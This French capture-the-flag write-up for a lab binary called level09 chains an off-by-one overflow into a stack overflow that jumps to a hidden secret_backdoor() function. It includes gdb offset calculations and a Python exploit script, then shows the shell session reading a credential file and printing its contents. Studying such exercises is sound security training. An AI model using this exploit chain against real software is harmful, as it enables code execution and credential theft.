# Level09

## Objectif

Exploiter un off by one overflow pour modifier une variable de taille, permettant ensuite un buffer overflow qui redirige l'execution vers secret_backdoor()

## Analyse du programme

### Execution normale

```
./level09
>: Enter your username
>>: test
>: Welcome, test
>: Msg @Unix-Dude
>>: hello
>: Msg sent!
```

Le programme demande un username puis un message

### Fonctions disponibles

```
(gdb) info functions
0x000055555555488c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
```

Il existe une fonction secret_backdoor() qui n'est jamais appelee

### Code de secret_backdoor()

```
(gdb) disas secret_backdoor
```

En analysant l'assembleur on voit que cette fonction:
- Lit notre input avec fgets()
- Execute notre input avec system()

Notre objectif est de faire sauter le programme vers cette fonction

## Reconstruction du code

### Structure de donnees

En analysant handle_msg() on identifie une structure qui stocke les donnees:

```
typedef struct s_message {
    char text[140];
    char username[40];
    int len;
} t_message;
```

Cette structure est creee sur la pile dans handle_msg()

### Fonction set_username()

```
void set_username(t_message *msg) {
    char buffer[128];
    fgets(buffer, 128, stdin);
    
    for (int i = 0; i <= 40; i++) {
        msg->username[i] = buffer[i];
    }
}
```

Bug identifie: la boucle fait 41 iterations au lieu de 40

### Fonction set_msg()

```
void set_msg(t_message *msg) {
    char buffer[1024];
    fgets(buffer, 1024, stdin);
    strncpy(msg->text, buffer, msg->len);
}
```

Cette fonction utilise msg->len pour savoir combien de bytes copier

## La chaine d'exploitation

### Etape 1: Comprendre la disposition memoire

Quand handle_msg() s'execute, voici comment la pile est organisee:

```
text[140]
username[40]
len (4 bytes)
Ancien pointeur de base
Adresse de retour (la ou le programme doit revenir)
```

La variable len est juste apres username[] en memoire
L'adresse de retour est 200 bytes apres le debut de text[]

### Etape 2: Exploiter l'off-by-one

On envoie 41 caracteres au lieu de 40:

```
Input: "A" * 40 + "\xd0"
```

Le 41eme caractere (valeur 208 en decimal) ecrase le premier byte de len

Resultat: len passe de 140 a 208

Pourquoi 208: on a besoin de 200 bytes pour atteindre l'adresse de retour plus 8 bytes pour ecrire la nouvelle adresse

### Verification avec GDB

```bash
(gdb) break *handle_msg+85
(gdb) run
(gdb) print $rbp
Adresse affichee: 0x7fffffffe590

(gdb) print $rbp - 0xc0
Adresse de text[]: 0x7fffffffe4d0

(gdb) print $rbp + 8
Adresse de retour: 0x7fffffffe598

(gdb) print 0x7fffffffe598 - 0x7fffffffe4d0
Distance en bytes: 200
```

### Etape 3: Buffer overflow vers l'adresse de retour

Maintenant que len vaut 208, strncpy() va copier 208 bytes au lieu de 140

On envoie:
```
"B" * 200 + adresse_de_secret_backdoor
```

Les 200 premiers bytes remplissent tout l'espace jusqu'a l'adresse de retour
Les 8 bytes suivants ecrasent l'adresse de retour avec l'adresse de secret_backdoor()

### Conversion de l'adresse en bytes

On ne peut pas ecrire directement 0x55555555488c car ce sont des caracteres texte

On utilise struct.pack() pour convertir le nombre en 8 bytes:

```
adresse = struct.pack('Q', 0x55555555488c)
```

Cela convertit 0x55555555488c en 8 bytes que la memoire peut lire comme une adresse

### Etape 4: Redirection d'execution

Quand handle_msg() termine:
- Le programme lit l'adresse de retour sur la pile
- Au lieu de retourner a main(), il saute a secret_backdoor()
- secret_backdoor() execute fgets() puis system() avec notre commande

## Script d'exploitation

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import struct

username = "A" * 40 + "\xd0"
message = "B" * 200 + struct.pack('Q', 0x55555555488c)
command = "/bin/sh"

print(username)
print(message)
print(command)
```

Le script genere 3 lignes:
- Ligne 1: pour set_username() qui modifie len
- Ligne 2: pour set_msg() qui ecrase l'adresse de retour
- Ligne 3: pour secret_backdoor() qui execute la commande

## Execution de l'exploit

### Generation du payload

```
python exploit.py > payload
```

### Exploitation finale

```
(cat payload; cat) | ./level09
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
